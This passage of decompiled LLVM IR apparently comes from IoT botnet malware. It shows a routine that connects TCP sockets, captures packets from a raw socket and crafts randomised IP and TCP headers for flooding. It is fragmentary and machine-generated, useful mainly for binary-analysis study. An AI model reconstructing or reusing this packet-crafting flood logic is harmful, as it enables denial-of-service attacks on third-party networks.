dec_label_pc_adbc:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_aef0
  %v0_adc4 = phi i32 [ %v3_af04, %dec_label_pc_aef0 ], [ %v3_adac, %dec_label_pc_ada0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aef0 ], [ %stack_var_-62.0, %dec_label_pc_ada0 ]
  %stack_var_-60.1 = phi i32 [ %v0_afc4, %dec_label_pc_aef0 ], [ %stack_var_-60.0, %dec_label_pc_ada0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_adc4 = call i32 @__libc_fcntl(i32 %v0_adc4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_adcc = or i32 %v2_adc4, 2048
  store i32 %v1_adcc, i32* @r2, align 4
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r0.global-to-local, align 4
  %v2_add4 = call i32 @__libc_fcntl(i32 %v0_add0, i32 4)
  %v3_add8 = load i32, i32* %stack_var_-44, align 4
  %v5_ade0 = mul i32 %v3_add8, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adf4 = add i32 %v5_ade0, %arg2
  store i32 %v2_adf4, i32* %r3.global-to-local, align 4
  %v1_adf8 = add i32 %v2_adf4, 20
  %v2_adf8 = inttoptr i32 %v1_adf8 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r2.global-to-local, align 4
  %v2_adfc = icmp ugt i8 %v3_adf8, 30
  %v7_adfc = icmp eq i8 %v3_adf8, 31
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ae00 = xor i1 %v7_adfc, true
  %v3_ae00 = and i1 %v2_adfc, %v2_ae00
  br i1 %v3_ae00, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_adbc
  %v5_ae00 = add i32 %v2_adf4, 16
  %v6_ae00 = inttoptr i32 %v5_ae00 to i32*
  %v7_ae00 = load i32, i32* %v6_ae00, align 4
  store i32 %v7_ae00, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_adbc, %bb
  %v4_ae04 = phi i32 [ %v2_adf4, %dec_label_pc_adbc ], [ %v7_ae00, %bb ]
  %v4_ae04.stack_var_-60.1 = select i1 %v3_ae00, i32 %v4_ae04, i32 %stack_var_-60.1
  %v2_ae08 = xor i1 %v2_adfc, true
  %v3_ae08 = or i1 %v7_adfc, %v2_ae08
  br i1 %v3_ae08, label %dec_label_pc_af50, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %bb71, %dec_label_pc_af50
  %v0_afc4 = phi i32 [ %v5_afa0, %dec_label_pc_af50 ], [ %v4_ae04.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v9_ae14 = icmp eq i32 %v0_ae14, 65535
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae14, label %dec_label_pc_afac, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ae0c
  %v4_ae18 = udiv i32 %v0_ae14, 256
  %v2_ae1c = urem i32 %v0_ae14, 256
  store i32 %v2_ae1c, i32* %r2.global-to-local, align 4
  %v5_ae20 = mul nuw nsw i32 %v2_ae1c, 256
  %v6_ae20 = or i32 %v5_ae20, %v4_ae18
  store i32 %v6_ae20, i32* %r3.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  %v2_ae28 = trunc i32 %v6_ae20 to i16
  store i16 %v2_ae28, i16* %v5_ae28, align 2
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %.thread9, %dec_label_pc_afac
  %stack_var_-62.2 = phi i16 [ %v1_afac, %dec_label_pc_afac ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_ae30, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ae38 = load i32, i32* @r5, align 4
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  %v3_ae3c = call i32 @__libc_connect(i32 %v0_ae38, i32 %v2_ae30, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae44 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae44, i32* %r0.global-to-local, align 4
  store i32 %v2_ae44, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %tmp35, %v0_afc4
  %v4_aecc = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_aea4 to i32
  %v9_aeb8 = icmp eq i1 %v9_aea4, false
  %v9_aed0 = icmp eq i32 %v3_aec4, %v4_aecc
  br label %dec_label_pc_ae60

dec_label_pc_ae50:                                ; preds = %.thread, %dec_label_pc_aec0, %dec_label_pc_aee8, %bb75
  %v2_ae50 = call i32 @__GI_time(i32* null)
  %v0_ae54 = load i32, i32* @r4, align 4
  %v2_ae54 = sub i32 %v2_ae50, %v0_ae54
  store i32 %v2_ae54, i32* %r0.global-to-local, align 4
  %v7_ae58 = icmp eq i32 %v2_ae54, 10
  store i1 %v7_ae58, i1* %cpsr_z.global-to-local, align 1
  %v8_ae5c = icmp sgt i32 %v2_ae54, 10
  br i1 %v8_ae5c, label %dec_label_pc_aef0, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae30
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae74, i32* %r1.global-to-local, align 4
  store i32 %v2_ae78, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae80 = load i32, i32* @sb, align 4
  store i32 %v0_ae80, i32* %r0.global-to-local, align 4
  %v6_ae88 = call i32 @__libc_recvfrom(i32 %v0_ae80, i32 %v2_ae74, i32 256, i32 16384, i32 %v2_ae68, i32 %v2_ae78)
  store i32 %v6_ae88, i32* %r2.global-to-local, align 4
  %v7_ae90 = icmp eq i32 %v6_ae88, -1
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae90, label %dec_label_pc_af44, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae60
  store i32 %v0_afc4, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_aeb0 = icmp eq i32 %v6_ae88, 40
  store i1 %v7_aeb0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae88, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae9c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae50

bb75:                                             ; preds = %dec_label_pc_ae9c
  store i1 %v9_aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb8, label %dec_label_pc_ae50, label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %bb75
  store i32 %v3_aec4, i32* @lr, align 4
  store i32 %v2_adec, i32* @r3, align 4
  store i32 %v4_aecc, i32* %r2.global-to-local, align 4
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aed0, label %dec_label_pc_aed8, label %dec_label_pc_ae50

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aec0
  store i32 %v4_aed8, i32* %r2.global-to-local, align 4
  store i32 %v1_aedc, i32* @r3, align 4
  store i1 %v2_aee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee0, label %dec_label_pc_afbc, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed8
  store i1 %v2_aee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee8, label %dec_label_pc_ae50, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_ae50
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r0.global-to-local, align 4
  %v1_aef4 = call i32 @__GI___libc_close(i32 %v0_aef0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_af04 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  %v3_af08 = icmp eq i32 %v3_af04, -1
  %v8_af08 = icmp eq i32 %v3_af04, -1
  store i1 %v8_af08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_af04, i32* @r5, align 4
  br i1 %v3_af08, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_af14:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ada0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ada0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aef0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ada0 ], [ %v0_afc4, %bb82 ], [ %v0_afc4, %dec_label_pc_aef0 ]
  %v3_af14 = load i32, i32* %stack_var_-44, align 4
  %v1_af18 = add i32 %v3_af14, 1
  store i32 %v1_af18, i32* @r3, align 4
  %v1_af1c = load i32, i32* @r6, align 4
  %v9_af1c = icmp eq i32 %v1_af18, %v1_af1c
  store i1 %v9_af1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af18, i32* %stack_var_-44, align 4
  %v5_af24 = icmp slt i32 %v1_af18, %v1_af1c
  br i1 %v5_af24, label %dec_label_pc_ada0, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af14
  store i32 %v6_ad1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1d8

dec_label_pc_af3c:                                ; preds = %dec_label_pc_ad60
  %v0_af3c = load i32, i32* @sb, align 4
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  %v1_af40 = call i32 @__GI___libc_close(i32 %v0_af3c)
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_ae60, %entry, %dec_label_pc_af3c
  %v1_af4c = phi i32 [ %v3_ad50, %entry ], [ %v1_af40, %dec_label_pc_af3c ], [ 0, %dec_label_pc_ae60 ]
  store i32 %v27_ab7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af4c

dec_label_pc_af50:                                ; preds = %bb71
  %v1_af50 = add i32 %v4_ae04, 16
  %v2_af50 = inttoptr i32 %v1_af50 to i32*
  %v3_af50 = load i32, i32* %v2_af50, align 4
  store i32 %v3_af50, i32* @r4, align 4
  %v0_af54 = call i32 @rand_next()
  store i32 %v0_af54, i32* %r0.global-to-local, align 4
  %v3_af58 = load i32, i32* %stack_var_-44, align 4
  %v5_af60 = mul i32 %v3_af58, 24
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = and i32 %v0_af68, 16711680
  store i32 %v1_af68, i32* %ip.global-to-local, align 4
  %v3_af6c = udiv i32 %v0_af68, 16777216
  %v2_af70 = add i32 %v5_af60, %arg2
  store i32 %v2_af70, i32* %r1.global-to-local, align 4
  %v4_af74 = udiv i32 %v1_af68, 256
  %v5_af74 = or i32 %v4_af74, %v3_af6c
  store i32 %v5_af74, i32* %r2.global-to-local, align 4
  %v1_af78 = and i32 %v0_af68, 65280
  store i32 %v1_af78, i32* %r3.global-to-local, align 4
  %v1_af7c = add i32 %v2_af70, 20
  %v2_af7c = inttoptr i32 %v1_af7c to i8*
  %v3_af7c = load i8, i8* %v2_af7c, align 1
  %v4_af7c = zext i8 %v3_af7c to i32
  store i32 %v4_af7c, i32* %ip.global-to-local, align 4
  %v5_af84 = call i32 @llvm.bswap.i32(i32 %v0_af68)
  %v7_af88 = lshr i32 %v0_af54, %v4_af7c
  %v8_af88 = add i32 %v7_af88, %v5_af84
  store i32 %v8_af88, i32* %r2.global-to-local, align 4
  %v1_af8c = and i32 %v8_af88, 16711680
  store i32 %v1_af8c, i32* %r0.global-to-local, align 4
  %v1_af98 = and i32 %v8_af88, 65280
  store i32 %v1_af98, i32* %r1.global-to-local, align 4
  %v5_afa0 = call i32 @llvm.bswap.i32(i32 %v8_af88)
  store i32 %v5_afa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_afac:                                ; preds = %dec_label_pc_ae0c
  %v0_afac = call i32 @rand_next()
  %v1_afac = trunc i32 %v0_afac to i16
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  store i32 %v2_adec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_afbc:                                ; preds = %dec_label_pc_aed8
  %v3_afbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afbc, i32* @r4, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v5_afc4 = mul i32 %v3_afbc, 16
  %v6_afc4 = add i32 %v5_afc4, %v2_ab98
  %v7_afc4 = inttoptr i32 %v6_afc4 to i32*
  store i32 %v0_afc4, i32* %v7_afc4, align 4
  %v0_afc8 = load i32, i32* @r8, align 4
  %v1_afc8 = add i32 %v0_afc8, 4
  %v2_afc8 = inttoptr i32 %v1_afc8 to i32*
  %v3_afc8 = load i32, i32* %v2_afc8, align 4
  store i32 %v3_afc8, i32* %r1.global-to-local, align 4
  %v1_afd4 = and i32 %v3_afc8, 65280
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  store i32 %v2_ab98, i32* %r0.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe4 = mul i32 %v0_afe4, 16
  %v2_afe8 = add i32 %v3_afe4, %v2_ab98
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  %v5_afec = call i32 @llvm.bswap.i32(i32 %v3_afc8)
  store i32 %v5_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v2_afe8, 4
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 %v5_afec, i32* %v3_aff0, align 4
  %v0_aff4 = load i32, i32* @r8, align 4
  %v1_aff4 = add i32 %v0_aff4, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
  store i32 %v3_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = and i32 %v3_aff4, 16711680
  store i32 %v1_aff8, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r2.global-to-local, align 4
  %v5_b010 = call i32 @llvm.bswap.i32(i32 %v3_aff4)
  store i32 %v5_b010, i32* %r3.global-to-local, align 4
  %v1_b014 = add i32 %v0_aff4, 2
  %v2_b014 = inttoptr i32 %v1_b014 to i16*
  %v3_b014 = load i16, i16* %v2_b014, align 2
  %v4_b014 = zext i16 %v3_b014 to i32
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  store i32 %v1_b018, i32* @r7, align 4
  %v0_b01c = load i32, i32* @lr, align 4
  %v1_b01c = trunc i32 %v0_b01c to i16
  %v2_b01c = load i32, i32* %ip.global-to-local, align 4
  %v3_b01c = add i32 %v2_b01c, 14
  %v4_b01c = inttoptr i32 %v3_b01c to i16*
  store i16 %v1_b01c, i16* %v4_b01c, align 2
  %v0_b020 = load i32, i32* %r1.global-to-local, align 4
  %v1_b020 = trunc i32 %v0_b020 to i16
  %v2_b020 = load i32, i32* %ip.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 12
  %v4_b020 = inttoptr i32 %v3_b020 to i16*
  store i16 %v1_b020, i16* %v4_b020, align 2
  %v0_b024 = load i32, i32* %r3.global-to-local, align 4
  %v1_b024 = load i32, i32* %ip.global-to-local, align 4
  %v2_b024 = add i32 %v1_b024, 8
  %v3_b024 = inttoptr i32 %v2_b024 to i32*
  store i32 %v0_b024, i32* %v3_b024, align 4
  %v0_b028 = load i32, i32* @r7, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v1_b02c = call i32 @malloc(i32 %v0_b028)
  store i32 %v1_b02c, i32* %r0.global-to-local, align 4
  store i32 %v2_aba8, i32* %r3.global-to-local, align 4
  %v2_b038 = load i32, i32* @r4, align 4
  %v5_b038 = mul i32 %v2_b038, 4
  %v6_b038 = add i32 %v5_b038, %v2_aba8
  %v7_b038 = inttoptr i32 %v6_b038 to i32*
  store i32 %v1_b02c, i32* %v7_b038, align 4
  %v3_b03c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b03c, i32* %r2.global-to-local, align 4
  %v0_b040 = load i32, i32* %r3.global-to-local, align 4
  %v4_b040 = mul i32 %v3_b03c, 4
  %v5_b040 = add i32 %v0_b040, %v4_b040
  %v6_b040 = inttoptr i32 %v5_b040 to i32*
  %v7_b040 = load i32, i32* %v6_b040, align 4
  store i32 %v7_b040, i32* @r4, align 4
  %v1_b044 = inttoptr i32 %v7_b040 to i8*
  %v2_b044 = load i8, i8* %v1_b044, align 1
  %tmp103 = urem i8 %v2_b044, 16
  %v1_b048 = zext i8 %tmp103 to i32
  %v1_b04c = or i32 %v1_b048, 64
  store i32 %v1_b04c, i32* %r3.global-to-local, align 4
  %v1_b050 = trunc i32 %v1_b04c to i8
  store i8 %v1_b050, i8* %v1_b044, align 1
  %v0_b054 = load i32, i32* @r4, align 4
  %v1_b054 = inttoptr i32 %v0_b054 to i8*
  %v2_b054 = load i8, i8* %v1_b054, align 1
  %v0_b058 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b058, 256
  %v1_b060 = and i8 %v2_b054, -16
  %v1_b064 = or i8 %v1_b060, 5
  %v1_b068 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b058, 256
  %v4_b06c = urem i32 %tmp78, 256
  %v5_b06c = or i32 %v4_b06c, %v1_b068
  store i32 %v5_b06c, i32* %r2.global-to-local, align 4
  %v0_b070 = load i32, i32* @fp, align 4
  %v1_b070 = urem i32 %v0_b070, 256
  store i32 %v1_b070, i32* %r0.global-to-local, align 4
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  %v3_b078 = udiv i32 %v0_b070, 256
  store i32 %v3_b078, i32* %r1.global-to-local, align 4
  store i8 %v1_b064, i8* %v1_b054, align 1
  %v0_b080 = load i32, i32* %r1.global-to-local, align 4
  %v1_b080 = load i32, i32* %r0.global-to-local, align 4
  %v4_b080 = mul i32 %v1_b080, 256
  %v5_b080 = or i32 %v4_b080, %v0_b080
  store i32 %v5_b080, i32* %r1.global-to-local, align 4
  store i32 %v4_b084, i32* %r0.global-to-local, align 4
  %v2_b088 = load i32, i32* @r4, align 4
  %v3_b088 = add i32 %v2_b088, 1
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v5_abe0, i8* %v4_b088, align 1
  %v0_b08c = load i32, i32* %r1.global-to-local, align 4
  %v1_b08c = trunc i32 %v0_b08c to i16
  %v2_b08c = load i32, i32* @r4, align 4
  %v3_b08c = add i32 %v2_b08c, 4
  %v4_b08c = inttoptr i32 %v3_b08c to i16*
  store i16 %v1_b08c, i16* %v4_b08c, align 2
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v0_b090, 0
  store i1 %v2_b090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b094, i32* %r1.global-to-local, align 4
  %v0_b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r4, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b090, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_afbc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_afbc, %bb79
  %v0_b0a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* @r4, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 8
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r4, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 9
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v4_b0a8, align 1
  %v0_b0ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ac, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  %v3_b0ac = load i32, i32* @r4, align 4
  %v4_b0ac = add i32 %v3_b0ac, 6
  %v5_b0ac = inttoptr i32 %v4_b0ac to i16*
  store i16 %v2_b0ac, i16* %v5_b0ac, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32* %r2.global-to-local, align 4
  %v2_b0b4 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_b0b4, i32* %r1.global-to-local, align 4
  %v1_b0b8 = load i32, i32* @r4, align 4
  %v2_b0b8 = add i32 %v1_b0b8, 12
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v2_b0b4, i32* %v3_b0b8, align 4
  %v3_b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b0bc, i32* %r3.global-to-local, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v4_b0c4 = mul i32 %v3_b0bc, 16
  %v5_b0c4 = add i32 %v4_b0c4, %v2_ab98
  %v6_b0c4 = inttoptr i32 %v5_b0c4 to i32*
  %v7_b0c4 = load i32, i32* %v6_b0c4, align 4
  store i32 %v7_b0c4, i32* %r2.global-to-local, align 4
  store i32 %v5_b0c4, i32* %r3.global-to-local, align 4
  %v1_b0d0 = load i32, i32* @r4, align 4
  %v2_b0d0 = add i32 %v1_b0d0, 16
  %v3_b0d0 = inttoptr i32 %v2_b0d0 to i32*
  store i32 %v7_b0c4, i32* %v3_b0d0, align 4
  %v0_b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 12
  %v2_b0d4 = inttoptr i32 %v1_b0d4 to i16*
  %v3_b0d4 = load i16, i16* %v2_b0d4, align 2
  %v4_b0d4 = zext i16 %v3_b0d4 to i32
  store i32 %v4_b0d4, i32* %r0.global-to-local, align 4
  %v1_b0d8 = add i32 %v0_b0d4, 8
  %v2_b0d8 = inttoptr i32 %v1_b0d8 to i32*
  %v3_b0d8 = load i32, i32* %v2_b0d8, align 4
  store i32 %v3_b0d8, i32* %r1.global-to-local, align 4
  %v2_b0dc = load i32, i32* @r4, align 4
  %v3_b0dc = add i32 %v2_b0dc, 20
  %v4_b0dc = inttoptr i32 %v3_b0dc to i16*
  store i16 %v3_b0d4, i16* %v4_b0dc, align 2
  %v0_b0e0 = load i32, i32* @r4, align 4
  %v1_b0e0 = add i32 %v0_b0e0, 20
  store i32 %v1_b0e0, i32* @r8, align 4
  %v1_b0e4 = add i32 %v0_b0e0, 33
  %v2_b0e4 = inttoptr i32 %v1_b0e4 to i8*
  %v3_b0e4 = load i8, i8* %v2_b0e4, align 1
  %v4_b0e4 = zext i8 %v3_b0e4 to i32
  store i32 %v4_b0e4, i32* %r2.global-to-local, align 4
  %v0_b0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0e8 = add i32 %v0_b0e0, 24
  %v3_b0e8 = inttoptr i32 %v2_b0e8 to i32*
  store i32 %v0_b0e8, i32* %v3_b0e8, align 4
  %v0_b0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ec = or i32 %v0_b0ec, 1
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v0_b0f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0f0 = add i32 %v0_b0f0, 4
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  store i32 %v3_b0f0, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f0, 14
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i16*
  %v3_b0f4 = load i16, i16* %v2_b0f4, align 2
  %v4_b0f4 = zext i16 %v3_b0f4 to i32
  store i32 %v4_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v1_b0ec to i8
  %v2_b0f8 = load i32, i32* @r8, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 13
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i8*
  store i8 %v1_b0f8, i8* %v4_b0f8, align 1
  %v0_b0fc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r8, align 4
  %v3_b0fc = add i32 %v2_b0fc, 2
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v1_b0fc, i16* %v4_b0fc, align 2
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 12
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v4_b100, i32* %r3.global-to-local, align 4
  %v1_b104 = add i32 %v0_b100, 13
  %v2_b104 = inttoptr i32 %v1_b104 to i8*
  %v3_b104 = load i8, i8* %v2_b104, align 1
  %v4_b104 = zext i8 %v3_b104 to i32
  %tmp104 = urem i8 %v3_b100, 16
  %v1_b108 = zext i8 %tmp104 to i32
  %v1_b10c = or i32 %v1_b108, 128
  store i32 %v1_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = or i32 %v4_b104, 16
  store i32 %v1_b110, i32* %r2.global-to-local, align 4
  %v0_b114 = load i32, i32* %r1.global-to-local, align 4
  %v2_b114 = add i32 %v0_b100, 8
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* %r3.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* @r8, align 4
  %v3_b118 = add i32 %v2_b118, 12
  %v4_b118 = inttoptr i32 %v3_b118 to i8*
  store i8 %v1_b118, i8* %v4_b118, align 1
  %v0_b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c = trunc i32 %v0_b11c to i8
  %v2_b11c = load i32, i32* @r8, align 4
  %v3_b11c = add i32 %v2_b11c, 13
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = call i32 @rand_next()
  %v1_b120 = trunc i32 %v0_b120 to i16
  store i32 %v0_b120, i32* %r0.global-to-local, align 4
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b128 = load i32, i32* @r8, align 4
  %v1_b128 = add i32 %v0_b128, 13
  %v2_b128 = inttoptr i32 %v1_b128 to i8*
  %v3_b128 = load i8, i8* %v2_b128, align 1
  %v4_b128 = zext i8 %v3_b128 to i32
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = and i32 %v4_b128, 223
  %v5_b134 = or i32 %v1_b130, %v4_b134
  store i32 %v5_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = trunc i32 %v5_b134 to i8
  store i8 %v1_b138, i8* %v2_b128, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b140 = load i32, i32* @r8, align 4
  %v1_b140 = add i32 %v0_b140, 13
  %v2_b140 = inttoptr i32 %v1_b140 to i8*
  %v3_b140 = load i8, i8* %v2_b140, align 1
  %v4_b140 = zext i8 %v3_b140 to i32
  store i32 %v1_b144, i32* %r3.global-to-local, align 4
  %v1_b148 = and i32 %v4_b140, 239
  %v5_b14c = or i32 %v1_b148, %v4_b14c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = trunc i32 %v5_b14c to i8
  store i8 %v1_b150, i8* %v2_b140, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b158 = load i32, i32* @r8, align 4
  %v1_b158 = add i32 %v0_b158, 13
  %v2_b158 = inttoptr i32 %v1_b158 to i8*
  %v3_b158 = load i8, i8* %v2_b158, align 1
  %v4_b158 = zext i8 %v3_b158 to i32
  store i32 %v1_b15c, i32* %r2.global-to-local, align 4
  %v1_b160 = and i32 %v4_b158, 247
  %v5_b164 = or i32 %v1_b160, %v4_b164
  store i32 %v5_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = trunc i32 %v5_b164 to i8
  store i8 %v1_b168, i8* %v2_b158, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b170 = load i32, i32* @r8, align 4
  %v1_b170 = add i32 %v0_b170, 13
  %v2_b170 = inttoptr i32 %v1_b170 to i8*
  %v3_b170 = load i8, i8* %v2_b170, align 1
  %v4_b170 = zext i8 %v3_b170 to i32
